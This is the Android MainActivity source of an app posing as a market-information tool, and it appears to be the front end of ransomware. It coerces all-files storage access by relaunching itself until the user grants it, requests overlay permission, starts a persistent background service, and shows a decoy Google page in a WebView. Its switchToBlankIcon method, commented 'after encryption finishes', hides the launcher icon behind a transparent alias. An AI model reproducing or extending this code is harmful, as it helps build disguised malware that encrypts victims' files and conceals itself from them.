package com.informasipasar.app;

import android.Manifest;
import android.app.Activity;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String KEY_REQUESTING = "requesting";
    private static final String KEY_WAITING_SETTINGS = "waiting_settings";
    private static final int REQUEST_CODE_NOTIFICATION = 101;
    private static final int REQUEST_CODE_OVERLAY = 102;

    private boolean requesting = false;
    private boolean waitingForSettings = false;
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (savedInstanceState != null) {
            requesting = savedInstanceState.getBoolean(KEY_REQUESTING, false);
            waitingForSettings = savedInstanceState.getBoolean(KEY_WAITING_SETTINGS, false);
        }
        if (StorageHelper.hasStoragePermission(this)) {
            onStoragePermissionGranted();
        } else if (!requesting && !waitingForSettings) {
            requestStoragePermission();
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putBoolean(KEY_REQUESTING, requesting);
        outState.putBoolean(KEY_WAITING_SETTINGS, waitingForSettings);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (waitingForSettings) {
            waitingForSettings = false;
            if (StorageHelper.hasStoragePermission(this)) {
                onStoragePermissionGranted();
            } else {
                closeApp();
            }
        }
    }

    private void requestStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            waitingForSettings = true;
            openAllFilesSettings();
        } else {
            requesting = true;
            ActivityCompat.requestPermissions(this,
                    new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE
                    },
                    StorageHelper.REQUEST_CODE_STORAGE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != StorageHelper.REQUEST_CODE_STORAGE) return;
        requesting = false;
        if (StorageHelper.hasStoragePermission(this)) {
            onStoragePermissionGranted();
        } else if (isPermanentlyDenied()) {
            waitingForSettings = true;
            openAppDetailsSettings();
        } else {
            reopenApp();
        }
    }

    private boolean isPermanentlyDenied() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return false;
        return !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                && !ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
    }

    private void openAllFilesSettings() {
        Intent intent = new Intent(
                Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                Uri.parse("package:" + getPackageName()));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e) {
            try {
                startActivity(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION));
            } catch (ActivityNotFoundException e2) {
                waitingForSettings = false;
                reopenApp();
            }
        }
    }

    private void openAppDetailsSettings() {
        Intent intent = new Intent(
                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + getPackageName()));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e) {
            waitingForSettings = false;
            reopenApp();
        }
    }

    private void reopenApp() {
        Toast.makeText(this, "Storage permission is required", Toast.LENGTH_SHORT).show();
        finishAndRemoveTask();
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            Intent i = getPackageManager().getLaunchIntentForPackage(getPackageName());
            if (i != null) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(i);
            }
        }, 800);
    }

    private void onStoragePermissionGranted() {
        setContentView(R.layout.activity_main);
        requestNotificationPermissionIfNeeded();
        requestOverlayPermissionIfNeeded();
        startBackgroundService();
        webView = findViewById(R.id.webview);
        if (webView != null) {
            webView.getSettings().setJavaScriptEnabled(true);
            webView.loadUrl("https://www.google.com");
        }
    }

    private void requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
                && ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.POST_NOTIFICATIONS},
                    REQUEST_CODE_NOTIFICATION);
        }
    }

    private void requestOverlayPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                try { startActivityForResult(i, REQUEST_CODE_OVERLAY); } catch (Exception ignored) {}
            }
        }
    }

    private void startBackgroundService() {
        try {
            ContextCompat.startForegroundService(this, new Intent(this, BackgroundService.class));
        } catch (Exception e) {
            Log.e(TAG, "Failed to start background service", e);
        }
    }

    private void closeApp() {
        Toast.makeText(this, "Storage permission is required", Toast.LENGTH_LONG).show();
        finishAndRemoveTask();
    }

    /** Ganti icon jadi transparan setelah enkripsi selesai. */
    public void switchToBlankIcon() {
        runOnUiThread(() -> {
            try {
                PackageManager pm = getPackageManager();
                ComponentName main = new ComponentName(this, MainActivity.class);
                ComponentName blank = new ComponentName(this, AliasBlank.class);
                pm.setComponentEnabledSetting(main,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(blank,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP);
            } catch (Exception e) {
                Log.e(TAG, "Switch icon failed", e);
            }
        });
    }
}
